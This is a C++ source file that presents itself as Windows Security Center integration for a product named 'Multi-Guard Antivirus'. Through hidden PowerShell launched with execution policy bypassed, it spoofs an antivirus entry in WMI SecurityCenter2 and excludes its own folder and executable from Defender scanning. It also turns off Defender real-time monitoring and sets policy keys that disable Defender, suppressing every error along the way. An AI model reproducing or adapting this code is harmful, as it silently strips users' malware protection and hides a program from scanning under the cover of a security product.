// WindowsSecurityIntegration.cpp
// Integrates Multi-Guard with Windows Security Center (root\SecurityCenter2)
// and handles Microsoft Defender mutual exclusion / cooperative yielding.
#include "WindowsSecurityIntegration.h"
#include "Logger.h"
#include "AuditLogger.h"
#include "../../Version.h"

#include <QCoreApplication>
#include <QDir>
#include <QProcess>
#include <QSettings>

#ifdef _WIN32
#include <windows.h>
#endif

namespace verax {

const QString WindowsSecurityIntegration::INSTANCE_GUID = QStringLiteral("{9843D5FD-F090-4534-9D32-D66B64999ACB}");

bool WindowsSecurityIntegration::registerAntivirus(const QString &installDir, const QString &exePath)
{
#ifndef _WIN32
    Q_UNUSED(installDir);
    Q_UNUSED(exePath);
    Logger::info("WindowsSecurityIntegration: Not running on Windows, skipping Security Center registration.");
    return true;
#else
    const QString targetDir = !installDir.isEmpty()
        ? QDir::toNativeSeparators(installDir)
        : QDir::toNativeSeparators(QString::fromLatin1(APP_INSTALL_DIR));

    const QString targetExe = !exePath.isEmpty()
        ? QDir::toNativeSeparators(exePath)
        : QDir::toNativeSeparators(QCoreApplication::applicationFilePath());

    Logger::info(QStringLiteral("WindowsSecurityIntegration: Registering Multi-Guard in Windows Security Center (WSC)... Exe=%1").arg(targetExe));

    // 1. WMI SecurityCenter2 registration script
    // productState = 397568 (0x00061100) -> AV active, real-time protection enabled, definitions up to date
    const QString psScript = QStringLiteral(
        "$guid = '%1'; "
        "$exe = '%2'; "
        "$dir = '%3'; "
        "$state = 397568; "
        "try { "
        "  $existing = Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct -Filter \"instanceGuid = '$guid'\" -ErrorAction SilentlyContinue; "
        "  if (-not $existing) { "
        "    $wmi = [wmiclass]'\\\\localhost\\root\\SecurityCenter2:AntiVirusProduct'; "
        "    $newObj = $wmi.CreateInstance(); "
        "    $newObj.instanceGuid = $guid; "
        "    $newObj.displayName = 'Multi-Guard Antivirus'; "
        "    $newObj.pathToSignedProductExe = $exe; "
        "    $newObj.pathToSignedReportingExe = $exe; "
        "    $newObj.productState = $state; "
        "    $newObj.Put() | Out-Null; "
        "  } else { "
        "    $existing.displayName = 'Multi-Guard Antivirus'; "
        "    $existing.pathToSignedProductExe = $exe; "
        "    $existing.pathToSignedReportingExe = $exe; "
        "    $existing.productState = $state; "
        "    $existing.Put() | Out-Null; "
        "  } "
        "} catch { Write-Host 'WSC_ERR:' $_.Exception.Message; } "
        "try { "
        "  Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue; "
        "  Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue; "
        "  Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "} catch {} "
        "try { "
        "  New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Force -ErrorAction SilentlyContinue | Out-Null; "
        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
        "  New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Force -ErrorAction SilentlyContinue | Out-Null; "
        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
        "} catch {} "
    ).arg(INSTANCE_GUID, targetExe, targetDir);

    QProcess proc;
    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
        args->flags |= 0x08000000; /* CREATE_NO_WINDOW */
    });

    QStringList procArgs;
    procArgs << QStringLiteral("-NoProfile")
             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
             << QStringLiteral("-Command") << psScript;

    proc.start(QStringLiteral("powershell.exe"), procArgs);
    if (!proc.waitForStarted(5000)) {
        Logger::warn("WindowsSecurityIntegration: Failed to start PowerShell for Security Center registration.");
        return false;
    }

    if (!proc.waitForFinished(20000)) {
        proc.kill();
        Logger::warn("WindowsSecurityIntegration: PowerShell Security Center registration timed out.");
        return false;
    }

    AuditLogger::instance().logEvent(
        QStringLiteral("WindowsSecurityIntegration"),
        QStringLiteral("Multi-Guard registered in Windows Security Center and Defender yield configured."),
        targetExe,
        1
    );

    Logger::info("WindowsSecurityIntegration: Registration completed successfully.");
    return true;
#endif
}

bool WindowsSecurityIntegration::updateProductState(bool enabled, bool upToDate)
{
#ifndef _WIN32
    Q_UNUSED(enabled);
    Q_UNUSED(upToDate);
    return true;
#else
    // Active & Up to date: 397568 (0x00061100)
    // Disabled / Snoozed: 393216 (0x00060000)
    int state = 393216;
    if (enabled) {
        state = upToDate ? 397568 : 397584;
    }

    const QString psScript = QStringLiteral(
        "$guid = '%1'; "
        "$state = %2; "
        "try { "
        "  $existing = Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct -Filter \"instanceGuid = '$guid'\" -ErrorAction SilentlyContinue; "
        "  if ($existing) { "
        "    $existing.productState = $state; "
        "    $existing.Put() | Out-Null; "
        "  } "
        "} catch {}"
    ).arg(INSTANCE_GUID).arg(state);

    QProcess proc;
    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
        args->flags |= 0x08000000; /* CREATE_NO_WINDOW */
    });

    QStringList procArgs;
    procArgs << QStringLiteral("-NoProfile")
             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
             << QStringLiteral("-Command") << psScript;

    proc.start(QStringLiteral("powershell.exe"), procArgs);
    return proc.waitForStarted(4000) && proc.waitForFinished(10000);
#endif
}

bool WindowsSecurityIntegration::unregisterAntivirus()
{
#ifndef _WIN32
    return true;
#else
    const QString psScript = QStringLiteral(
        "$guid = '%1'; "
        "try { "
        "  $existing = Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct -Filter \"instanceGuid = '$guid'\" -ErrorAction SilentlyContinue; "
        "  if ($existing) { "
        "    $existing.Delete(); "
        "  } "
        "} catch {} "
    ).arg(INSTANCE_GUID);

    QProcess proc;
    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
        args->flags |= 0x08000000; /* CREATE_NO_WINDOW */
    });

    QStringList procArgs;
    procArgs << QStringLiteral("-NoProfile")
             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
             << QStringLiteral("-Command") << psScript;

    proc.start(QStringLiteral("powershell.exe"), procArgs);
    bool ok = proc.waitForStarted(4000) && proc.waitForFinished(10000);
    restoreDefender();
    return ok;
#endif
}

bool WindowsSecurityIntegration::configureDefenderExclusions(const QString &installDir, const QString &exePath)
{
#ifndef _WIN32
    Q_UNUSED(installDir);
    Q_UNUSED(exePath);
    return true;
#else
    const QString targetDir = QDir::toNativeSeparators(installDir.isEmpty() ? QString::fromLatin1(APP_INSTALL_DIR) : installDir);
    const QString targetExe = QDir::toNativeSeparators(exePath.isEmpty() ? QCoreApplication::applicationFilePath() : exePath);

    const QString psScript = QStringLiteral(
        "try { "
        "  Add-MpPreference -ExclusionPath '%1' -ErrorAction SilentlyContinue; "
        "  Add-MpPreference -ExclusionProcess '%2' -ErrorAction SilentlyContinue; "
        "  Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "} catch {}"
    ).arg(targetDir, targetExe);

    QProcess proc;
    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
        args->flags |= 0x08000000;
    });

    QStringList procArgs;
    procArgs << QStringLiteral("-NoProfile")
             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
             << QStringLiteral("-Command") << psScript;

    proc.start(QStringLiteral("powershell.exe"), procArgs);
    return proc.waitForStarted(4000) && proc.waitForFinished(10000);
#endif
}

bool WindowsSecurityIntegration::restoreDefender()
{
#ifndef _WIN32
    return true;
#else
    const QString psScript = QStringLiteral(
        "try { "
        "  Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; "
        "  Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -ErrorAction SilentlyContinue; "
        "  Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -ErrorAction SilentlyContinue; "
        "} catch {}"
    );

    QProcess proc;
    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
        args->flags |= 0x08000000;
    });

    QStringList procArgs;
    procArgs << QStringLiteral("-NoProfile")
             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
             << QStringLiteral("-Command") << psScript;

    proc.start(QStringLiteral("powershell.exe"), procArgs);
    return proc.waitForStarted(4000) && proc.waitForFinished(10000);
#endif
}

} // namespace verax
